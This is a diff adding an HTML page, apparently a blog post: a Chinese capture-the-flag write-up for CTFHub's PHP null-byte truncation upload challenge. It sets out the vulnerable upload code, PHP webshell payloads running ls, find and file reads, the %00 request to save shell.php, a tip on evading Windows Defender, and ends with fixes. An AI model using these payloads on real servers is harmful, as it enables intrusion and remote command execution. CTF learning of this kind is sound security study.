@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-00截断 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href=" ">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-00截断 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.17 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, 文件上传, 00截断, BurpSuite</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - 文件上传 / 00截断</li>
+        <li><strong>题目名称：</strong>00截断</li>
+        <li><strong>提示：</strong>了解 PHP 5.2.0 截断上传的原理</li>
+    </ul>
+
+    <h2>2. 解题思路</h2>
+    <p>本题目的是通过 PHP 5.2.0 版本中存在的“00截断”漏洞来绕过服务器的白名单和后缀校验。经过代码审计发现，后端将上传的文件重命名保存到 <code>$_GET['road']</code> 拼接的路径下。当 C 语言底层字符串遇到 <code>%00</code> 时会发生截断，我们可以构造 URL 参数为 <code>/?road=/var/www/html/upload/shell.php%00</code>，使最终保存的文件名固定为 <code>shell.php</code>，从而绕过对图片后缀的检测。</p >
+
+    <h2>3. 操作步骤</h2>
+    
+    <p><strong>第一步：初探与自动化尝试</strong></p >
+    <p>起初尝试用 Python 脚本上传带有 PHP 代码的文件。编写了 <code>111.py</code> 进行上传测试。过程中遇到两个严重问题：</p >
+    <ul>
+        <li><strong>路径报错：</strong>由于 Windows 隐藏了文件扩展名，导致脚本报 <code>FileNotFoundError</code>，找不到真实的文件路径。</li>
+        <li><strong>Requests库自动转义：</strong>在 URL 中手动拼接 <code>%00</code> 时，Python 的 <code>requests</code> 库会自动将其转义为 <code>%2500</code>，导致服务器接收到的字符失去截断效果，导致上传失败。</li>
+    </ul>
+
+    <p><strong>第二步：本地环境被拦截</strong></p >
+    <p>尝试在 VS Code 或记事本中直接给真实图片（<code>2.jpg</code>、<code>3.jpg</code>）末尾添加 PHP 木马代码。但在保存时，Windows Defender 立刻弹窗报毒，导致文件无法正常编辑或直接被锁定。同时，在另存为图片时，由于忘记将保存类型改为“所有文件”，导致后缀名变成了 <code>3.jpg.txt</code>，引发了后续的路径报错。</p >
+
+    <p><strong>第三步：代码审计寻找破局点</strong></p >
+    <p>查阅官方 Writeup 并审计服务器源码，发现核心逻辑如下：</p >
+    <pre><code>$name = basename($_FILES['file']['name']);
+$ext = $info['extension'];
+$whitelist = array("jpg", "png", "gif");
+if (in_array($ext, $whitelist)) {
+    $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) { ... }
+}</code></pre>
+    <p>分析得出：不能修改文件名，必须保持 <code>jpg</code> 后缀以通过白名单；破局点在于修改 <code>GET</code> 参数 <code>road</code>，利用 <code>%00</code> 截断路径。</p >
+
+    <p><strong>第四步：Burp Suite 精确制导（成功）</strong></p >
+    <p>放弃 Python 脚本，回归最纯粹的 Burp Suite 拦截改包：</p >
+    <ol>
+        <li>在 VS Code 中新建文件，写入纯文本木马 <code>&lt;?php system('ls /'); ?&gt;</code>，保存为 <code>3.jpg</code>（选择“所有文件”类型）。</li>
+        <li>开启 Burp 拦截（<code>Intercept is on</code>），在 Burp 浏览器中上传该 <code>3.jpg</code>。</li>
+        <li>拦截到 <code>POST</code> 请求后，切到 <code>Raw</code> 视图，将第一行的 URL 修改为：<br><code>POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1</code></li>
+        <li>点击 <code>Forward</code> 放行请求，关闭拦截。浏览器提示“上传成功”。</li>
+        <li>在浏览器地址栏访问 <code>http://题目URL/upload/shell.php</code>，成功执行命令并显示根目录列表。</li>
+    </ol>
+
+    <p><strong>第五步：全盘搜索并读取 Flag（详细操作流程）</strong></p >
+    <p>已知根目录没有 flag，我们需要两次重新上传木马，分别用来“寻找路径”和“读取内容”：</p >
+    
+    <p><strong>📍 第一次重新上传（寻找 flag 文件路径）</strong></p >
+    <ol>
+        <li><strong>修改代码：</strong>在 VS Code 中打开 <code>3.jpg</code>，把代码替换为：<br><code>&lt;?php system('find / -name "flag*" 2>/dev/null'); ?&gt;</code><br>按 <code>Ctrl + S</code> 保存。</li>
+        <li><strong>开启拦截：</strong>切回 Burp，点击 <code>Proxy</code> -> <code>Intercept</code>，确认 <code>Intercept is on</code>（开启拦截）。</li>
+        <li><strong>上传文件：</strong>切回 Burp 浏览器，选择刚保存的 <code>3.jpg</code>，点击 <code>Submit</code>。</li>
+        <li><strong>修改 URL：</strong>拦截到 POST 请求后，在 <code>Raw</code> 视图第一行将 URL 改为：<br><code>POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1</code></li>
+        <li><strong>放行请求：</strong>点击橙色 <code>Forward</code> 放行，然后点击 <code>Intercept is on</code> 变成 <code>off</code>（关闭拦截）。</li>
+        <li><strong>获取路径：</strong>在浏览器访问 <code>http://题目URL/upload/shell.php</code>，页面会打印出 Flag 文件的绝对路径（如 <code>/var/www/html/flag_2292524873.php</code>）。<strong>记下这个路径。</strong></li>
+    </ol>
+
+    <p><strong>📍 第二次重新上传（读取 flag 内容）</strong></p >
+    <ol>
+        <li><strong>修改代码：</strong>回到 VS Code，把代码替换为（注意替换成上一步真实的路径）：<br><code>&lt;?php echo htmlspecialchars(file_get_contents('/var/www/html/flag_2292524873.php')); ?&gt;</code><br>按 <code>Ctrl + S</code> 保存（如果杀毒软件拦截，点允许）。</li>
+        <li><strong>开启拦截：</strong>切回 Burp，再次开启拦截 <code>Intercept is on</code>。</li>
+        <li><strong>再次上传：</strong>切回浏览器，选择更新后的 <code>3.jpg</code>，点击 <code>Submit</code>。</li>
+        <li><strong>再次改 URL：</strong>在 Burp 的 <code>Raw</code> 视图第一行，再次加上截断代码：<br><code>POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1</code></li>
+        <li><strong>放行并访问：</strong>点击 <code>Forward</code>，关闭拦截。在浏览器刷新 <code>http://题目URL/upload/shell.php</code>，Flag 就会直接显示在页面上！</li>
+    </ol>
+    <pre><code>ctfhub{6386852e130a9ac212f18507}</code></pre>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>Windows 的“自作聪明”（文件扩展名陷阱）：</strong>在 VS Code 另存为文件时，如果未选择“所有文件”类型，系统会自动追加默认后缀（如 .txt）。这会导致后续 Python 报找不到文件，或者服务器白名单校验直接拦截。务必在文件夹设置中开启“显示文件扩展名”来核对真实名称。</li>
+        <li><strong>不要迷信自动化脚本：</strong>Python 的 <code>requests</code> 库在处理 URL 参数时非常“聪明”，它会自动对特殊字符进行 URL 编码。遇到需要精确控制 <code>%00</code> 等特殊字节的场景，手动使用 Burp Suite 拦截改包是最稳妥的方法。</li>
+        <li><strong>本地杀毒软件与网络发包的区别：</strong>Windows Defender 会拦截本地文件中的木马，但在网络请求中传输木马字符串通常不会。我们要学会在 Burp 里直接修改数据包，绕过本地环境的限制。</li>
+        <li><strong>截断位置的判断：</strong>这题的截断点在于 URL 参数拼接的路径，而不是文件名本身。必须仔细审计源代码，找到 <code>$des = $_GET['road'] . "/" . ...</code> 这一行，才能准确找到注入 <code>%00</code> 的位置。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>PHP 5.2.0 00 截断漏洞：</strong>当 PHP 底层使用 C 语言函数处理字符串时，遇到空字节 <code>%00</code> 会认为字符串已结束。利用这一特性可以截断原本要拼接的文件后缀或目录路径，实现绕过。</li>
+        <li><strong>WebShell 交互进阶：</strong>上传的木马不仅可以执行简单的 <code>ls</code>，还可以执行 <code>find</code> 全盘搜索，并通过 <code>file_get_contents</code> 读取特定文件内容。结合 <code>htmlspecialchars</code> 可以安全地将内容输出到浏览器。</li>
+        <li><strong>安全防御建议：</strong>升级 PHP 版本，废弃旧版不安全的字符串处理方式；对用户可控的路径参数进行严格的校验；使用白名单机制限制上传文件类型。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
